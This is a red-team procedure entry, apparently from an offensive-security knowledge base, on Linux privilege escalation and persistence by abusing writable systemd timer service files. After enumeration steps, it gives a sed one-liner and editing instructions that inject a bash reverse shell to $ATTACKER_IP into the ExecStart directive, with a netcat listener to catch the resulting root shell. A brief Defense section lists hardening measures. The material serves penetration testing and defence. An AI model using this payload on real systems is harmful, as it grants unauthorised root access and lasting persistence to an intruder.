---
id: 57f1636e-c3b1-4b6a-b794-16f90d05fea6
name: Linux-Privilege-Escalation-via-Systemd-Timers
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.771506+00:00'
updated_at: '2023-04-10T20:34:34.059146+00:00'
tactics:
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Scheduled-Task-Job|T1053 - Scheduled Task/Job]]'
sub_techniques:
  - '[[sub-techniques/Systemd-Timers|T1053.006 - Systemd Timers]]'
tags:
  - '[[tags/Linux-Privilege-Escalation]]'
  - '[[tags/Systemd-timers]]'
commands:
  - '[[commands/systemctl-list-timers-all]]'
  - '[[commands/systemctl-cat-unit-file]]'
  - '[[commands/ls-l-file-permissions]]'
  - '[[commands/systemctl-daemon-reload]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-Systemd-Timers

## Summary

This procedure demonstrates how to escalate privileges on a Linux system by abusing systemd timers. Systemd timers schedule recurring tasks, often running with elevated privileges. If a system timer's associated service file is misconfigured and writable by a low-privileged user, an attacker can modify the ExecStart directive to execute arbitrary code as root, leading to privilege escalation and potential persistence.

## Description

Systemd timers are used on modern Linux distributions to manage scheduled jobs, replacing traditional cron in many cases. They consist of a .timer unit that triggers a .service unit. System timers (in /etc/systemd/system or /lib/systemd/system) typically run as root. A common misconfiguration occurs when these unit files are world-writable or owned by a group the attacker belongs to, allowing modification. By editing the service file to inject a reverse shell or other payload into the ExecStart line, the attacker can gain root access when the timer triggers. This technique is useful in post-exploitation for escalating from a standard user to root and establishing persistence through scheduled execution. Detection involves monitoring file changes in systemd directories and auditing permissions.

## Requirements

1. Low-privileged shell access on a Linux system using systemd (e.g., Ubuntu 18.04+, CentOS 7+).
2. The target system's systemd service files must have writable permissions for the current user (misconfiguration check).
3. Attacker-controlled host for receiving reverse shells (e.g., with netcat listener).
4. Basic knowledge of Linux file permissions and systemd unit files.

## Defense

- Set strict permissions on systemd unit files (e.g., chmod 644 /etc/systemd/system/*.service, owned by root).
- Use file integrity monitoring tools like AIDE or auditd to detect changes in /etc/systemd/system and /lib/systemd/system.
- Regularly audit timers and services with systemctl list-timers and review ExecStart paths.
- Implement immutable file attributes (chattr +i) on critical unit files.
- Monitor for unexpected root processes or outbound connections from scheduled tasks.

## Objectives

1. Identify abusable systemd timers and their associated service files.
2. Modify a writable service file to inject a privilege-escalating payload.
3. Achieve root shell access via timer execution for further compromise or persistence.

## Instructions

### Step 1: Enumerate Systemd Timers

**Context**: Begin by listing all active and inactive timers to identify potential targets. This reveals scheduled tasks that run as root and their associated services.

**Command** ([[commands/systemctl-list-timers-all]]):
```bash
systemctl list-timers --all
```

> This command displays all timers, including their next run time, last run, and the service they activate. Look for system timers (e.g., apt-daily.timer) that might have associated services in writable locations.

### Step 2: Examine Unit Files

**Context**: For promising timers (e.g., those activating services in /lib/systemd/system), view the timer and service unit files to understand their configuration, including the ExecStart path in the service file.

**Command** ([[commands/systemctl-cat-unit-file]]):
```bash
systemctl cat $_UNIT
```

> Replace $_UNIT with the timer or service name, e.g., 'apt-daily.service'. This shows the full unit configuration. Note the ExecStart= line, which specifies the command to run— this is the target for modification if the file is writable.

### Step 3: Check File Permissions

**Context**: Verify if the service unit file is writable by your user. System files should not be, but misconfigurations (e.g., chmod 666) allow editing.

**Command** ([[commands/ls-l-file-permissions]]):
```bash
ls -l $_FILE_PATH
```

> Replace $_FILE_PATH with the service file path from Step 2, e.g., '/lib/systemd/system/apt-daily.service'. Success if permissions show write access for your user or group (e.g., -rw-rw-r--).

### Step 4: Modify the Service File and Inject Payload

**Context**: If the file is writable, edit the ExecStart line to prepend or replace with a malicious command that executes a reverse shell as root when the timer triggers. Use a text editor like vi or sed for modification.

**Instructions**: Open the file with vi $_FILE_PATH and locate the [Service] section. Modify ExecStart to: ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 ; original_command'. Replace the payload with content from [[codes/Bash-TCP-Reverse-Shell]]. Save and exit.

Alternatively, use sed for targeted replacement:
```bash
sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 ; \0"|' $_FILE_PATH
```

> This preserves the original command (\0) while injecting the shell. Set up a listener on your attacker machine (e.g., nc -lvnp $ATTACKER_PORT) before triggering.

### Step 5: Reload Daemon and Trigger Execution

**Context**: Reload systemd to apply changes, then wait for the timer or manually start the service if permitted, to execute the modified payload as root.

**Command** ([[commands/systemctl-daemon-reload]]):
```bash
systemctl daemon-reload
```

> This reloads unit files without restarting services. If the timer is soon, wait; otherwise, attempt 'systemctl start $_SERVICE' (may require privileges). Monitor your listener for the incoming root shell.

**Expected Output**: On success, a root shell connects to your listener (e.g., bash prompt with #). Verify with 'whoami' outputting 'root'.

**Success Indicators**:
- Unit file modified without permission errors.
- Daemon reload succeeds without syntax errors.
- Reverse shell received on attacker listener upon trigger.
